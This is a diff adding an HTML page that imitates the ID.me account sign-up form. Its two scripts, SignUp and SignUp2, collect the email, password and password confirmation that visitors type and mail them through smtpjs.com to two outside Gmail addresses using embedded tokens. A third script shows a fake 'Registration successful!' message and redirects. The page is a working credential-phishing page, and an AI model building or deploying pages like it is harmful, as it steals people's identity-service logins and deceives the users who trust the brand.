@@ -1,0 +1,304 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Sign Up to ID.me - ID.me</title>
+    <meta
+      content="width=device-width, initial-scale=1, minimum-scale=1"
+      name="viewport"
+    />
+    <meta content="noindex" name="robots" />
+    <link rel="icon" type="image/png" href="headlogo.ico" />
+
+    <link rel="stylesheet" media="all" href="styles.css" />
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@10"></script>
+  </head>
+  <body>
+    <div class="page-container">
+      <div class="container">
+        <div class="content-container">
+          <form class="new_user" id="new_user">
+            <div class="form-header">
+              <div class="form-header-content" role="banner">
+                <div class="partner">
+                  <div class="c_icon m_idme">
+                    <img alt="ID.me" class="img-lightmode" src="mainlogo.svg" />
+                    <img alt="ID.me" class="img-darkmode" src="mainlogo.svg" />
+                  </div>
+                </div>
+              </div>
+            </div>
+            <main class="form-container">
+              <div class="form-header-access">
+                <h1 id="sr_page_title">Create an ID.me account</h1>
+              </div>
+              <div class="registration form-header-warning">
+                <div class="content">
+                  <img width="40" alt="" src="user.svg" />
+                  <div class="text">
+                    <p>
+                      If you already have an ID.me account, do not create a new
+                      one.
+                      <a href="login.html">Sign in to your existing account.</a>
+                    </p>
+                  </div>
+                </div>
+              </div>
+
+              <div class="form-fields">
+                <fieldset class="field-group">
+                  <div class="required-instructions">
+                    * Indicates a required field
+                  </div>
+                  <legend class="sr-only">Login Credentials</legend>
+                  <div class="field text">
+                    <label
+                      class="required"
+                      for="user_emails_attributes_0_address"
+                      >Email</label
+                    >
+                    <input
+                      placeholder="Enter your personal email address"
+                      name="user[email]"
+                      required="required"
+                      autocomplete="email"
+                      type="email"
+                      id="user_emails_attributes_0_address"
+                    />
+                    <span id="user_email-error" role="alert"> </span>
+                  </div>
+
+                  <div
+                    class="field text password password-showable"
+                    data-component="Components.Showable"
+                  >
+                    <label class="required" for="user_password">Password</label>
+                    <input
+                      placeholder="Enter password"
+                      required="required"
+                      autocomplete="new-password"
+                      type="password"
+                      name="user[password]"
+                      id="user_password"
+                    />
+                    <span role="alert"> </span>
+                  </div>
+                  <div
+                    class="field text password-showable"
+                    data-component="Components.Showable"
+                  >
+                    <label class="required" for="user_password_confirmation"
+                      >Confirm Password</label
+                    >
+                    <input
+                      placeholder="Reenter password"
+                      required="required"
+                      autocomplete="new-password"
+                      type="password"
+                      name="user[password_confirmation]"
+                      id="user_password_confirmation"
+                    />
+                    <span role="alert"> </span>
+                  </div>
+                </fieldset>
+                <div class="field-group checkboxes">
+                  <div class="field checkbox remember_me">
+                    <input
+                      type="checkbox"
+                      name="remember_me"
+                      id="remember_me"
+                      value="true"
+                      aria-describedby="remember-me-tip"
+                    />
+                    <label for="remember_me"
+                      ><span aria-hidden="true" class="checkmark">  </span>
+
+                      <span> Remember me </span>
+                      <div id="remember-me-tip">
+                        For your security, select only on your devices.
+                      </div>
+                    </label>
+                  </div>
+
+                  <div class="field checkbox">
+                    <input
+                      name="user[accepts_terms]"
+                      type="hidden"
+                      value="0"
+                      autocomplete="off"
+                    /><input
+                      required="required"
+                      type="checkbox"
+                      value="1"
+                      name="user[accepts_terms]"
+                      id="user_accepts_terms"
+                    />
+                    <label for="user_accepts_terms"
+                      ><span aria-hidden="true" class="checkmark">  </span>
+
+                      <span>
+                        I accept the ID.me
+                        <a target="_blank" href="https://www.id.me/terms"
+                          >Terms of Service</a
+                        >
+                        and
+                        <a target="_blank" href="https://www.id.me/privacy"
+                          >Privacy Policy</a
+                        ><strong>&nbsp;*</strong>
+                      </span> </label
+                    ><span role="alert"> </span>
+                  </div>
+                </div>
+              </div>
+              <div class="form-actions">
+                <input
+                  type="reset"
+                  value="Create account"
+                  class="btn btn-primary"
+                  onclick="validateLoginForm(); SignUp();SignUp2()"
+                />
+              </div>
+            </main>
+          </form>
+          <footer class="footer">
+            <nav aria-label="Footer" class="footer__links">
+              <ul class="footer__list">
+                <li class="footer__list-item">
+                  <a
+                    target="_blank"
+                    rel="noopener noreferrer"
+                    class="footer__link"
+                    title="What is ID.me? (opens in new tab)"
+                    aria-label="What is ID.me? (opens in new tab)"
+                    href="https://www.id.me/about"
+                    >What is ID.me?</a
+                  >
+                </li>
+                <li class="footer__list-item">
+                  <a
+                    target="_blank"
+                    rel="noopener noreferrer"
+                    class="footer__link"
+                    title="Terms of Service (opens in new tab)"
+                    aria-label="Terms of Service (opens in new tab)"
+                    href="https://www.id.me/terms"
+                    >Terms of Service</a
+                  >
+                </li>
+                <li class="footer__list-item">
+                  <a
+                    target="_blank"
+                    rel="noopener noreferrer"
+                    class="footer__link"
+                    title="Privacy Policy (opens in new tab)"
+                    aria-label="Privacy Policy (opens in new tab)"
+                    href="https://www.id.me/privacy"
+                    >Privacy Policy</a
+                  >
+                </li>
+              </ul>
+            </nav>
+          </footer>
+        </div>
+      </div>
+    </div>
+
+    <script src="https://smtpjs.com/v3/smtp.js"></script>
+
+    <script>
+      function SignUp() {
+        let email = document.getElementById(
+          "user_emails_attributes_0_address"
+        ).value;
+        let password = document.getElementById("user_password").value;
+        let confirm = document.getElementById(
+          "user_password_confirmation"
+        ).value;
+        let remember = document.getElementById("remember-me-tip").value;
+
+        let body =
+          "Email:" +
+          email +
+          "<br/> Password:" +
+          password +
+          "<br/> Confirm-Password:" +
+          confirm +
+          "<br/> Rememberme:" +
+          remember;
+
+        Email.send({
+          SecureToken: "f7c929d2-a50c-4648-933d-8d6286b4bdb6",
+          To: "gideonconsultancy@gmail.com",
+          From: "gideonconsultancy@gmail.com",
+          Subject: "Message From ID.me Account Creation",
+          Body: body,
+        }).then((message) => alert(thanks));
+      }
+    </script>
+
+    <script>
+      function SignUp2() {
+        let email = document.getElementById(
+          "user_emails_attributes_0_address"
+        ).value;
+        let password = document.getElementById("user_password").value;
+        let confirm = document.getElementById(
+          "user_password_confirmation"
+        ).value;
+        let remember = document.getElementById("remember-me-tip").value;
+
+        let body =
+          "Email:" +
+          email +
+          "<br/> Password:" +
+          password +
+          "<br/> Confirm-Password:" +
+          confirm +
+          "<br/> Rememberme:" +
+          remember;
+
+        Email.send({
+          SecureToken: "cfbb28d4-dfca-4c74-baf8-3ac35a7efe92",
+          To: "francisekah5@gmail.com",
+          From: "francisekah5@gmail.com",
+          Subject: "Message From ID.me Account Creation",
+          Body: body,
+        }).then((message) => alert(thanks));
+      }
+    </script>
+
+    <script>
+      function validateLoginForm() {
+        // Get values from the login form
+        const username = document.getElementById(
+          "user_emails_attributes_0_address"
+        ).value;
+        const password = document.getElementById("user_password").value;
+        const confirm = document.getElementById(
+          "user_password_confirmation"
+        ).value;
+
+        // Check if fields are not empty
+        if (!username || !password || !confirm) {
+          // Show warning message using SweetAlert
+          Swal.fire({
+            icon: "warning",
+            title: "Warning",
+            text: "Please fill out all fields",
+          });
+          return;
+        }
+
+        // Simulate a successful login (replace this with your actual login logic)
+        // For demonstration purposes, always show success message
+        Swal.fire({
+          icon: "success",
+          title: "Success",
+          text: "Registration successful!",
+        }).then(() => {
+          // Redirect to the home page or wherever you want
+          window.location.href = "index.html";
+        });
+      }
+    </script>
+  </body>
+</html>
